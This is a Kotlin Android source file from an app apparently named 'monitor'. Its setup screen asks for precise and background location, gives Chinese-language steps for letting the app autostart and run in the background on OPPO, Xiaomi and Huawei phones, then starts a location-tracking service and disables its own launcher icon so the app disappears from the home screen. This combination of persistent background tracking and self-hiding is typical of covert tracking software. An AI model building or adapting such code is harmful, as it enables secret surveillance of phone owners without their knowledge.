package com.monitor.app.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.monitor.app.R
import com.monitor.app.location.LocationService

class GuideActivity : ComponentActivity() {

    private val requiredPermissions = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
            if (allGranted()) {
                startServiceAndFinish()
            } else {
                updateStatus()
                Toast.makeText(this, "请授予所有必需权限后再启动", Toast.LENGTH_SHORT).show()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_guide)

        updateStatus()

        findViewById<Button>(R.id.btn_finish).setOnClickListener {
            if (allGranted()) {
                startServiceAndFinish()
            } else {
                permissionLauncher.launch(requiredPermissions.toTypedArray())
            }
        }
    }

    private fun allGranted(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun updateStatus() {
        val sb = StringBuilder()
        sb.appendLine("以下权限必须全部授予后方可启动服务：\n")
        for (perm in requiredPermissions) {
            val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
            val name = when {
                perm.contains("FINE_LOCATION") -> "精准定位"
                perm.contains("BACKGROUND_LOCATION") -> "后台定位"
                perm.contains("POST_NOTIFICATIONS") -> "通知"
                else -> perm
            }
            sb.appendLine("${if (granted) "[已授权]" else "[未授权]"} $name")
        }

        val instructions = when {
            Build.MANUFACTURER.equals("OPPO", ignoreCase = true) ||
            Build.MANUFACTURER.equals("OnePlus", ignoreCase = true) ->
                "\nOPPO 设备额外步骤：设置 → 应用管理 → 本应用 → 耗电保护 → 允许后台运行"
            Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true) ->
                "\n小米设备额外步骤：设置 → 应用设置 → 授权管理 → 自启动管理 → 允许本应用自启动"
            Build.MANUFACTURER.equals("Huawei", ignoreCase = true) ->
                "\n华为设备额外步骤：手机管家 → 应用启动管理 → 关闭自动管理 → 允许自启动"
            else -> ""
        }
        sb.append(instructions)

        findViewById<TextView>(R.id.guide_text).text = sb.toString()
    }

    private fun startServiceAndFinish() {
        disableLauncherIcon()
        val intent = Intent(this, LocationService::class.java)
        startForegroundService(intent)
        finish()
    }

    private fun disableLauncherIcon() {
        val componentName = android.content.ComponentName(
            this, "com.monitor.app.ui.GuideActivity"
        )
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
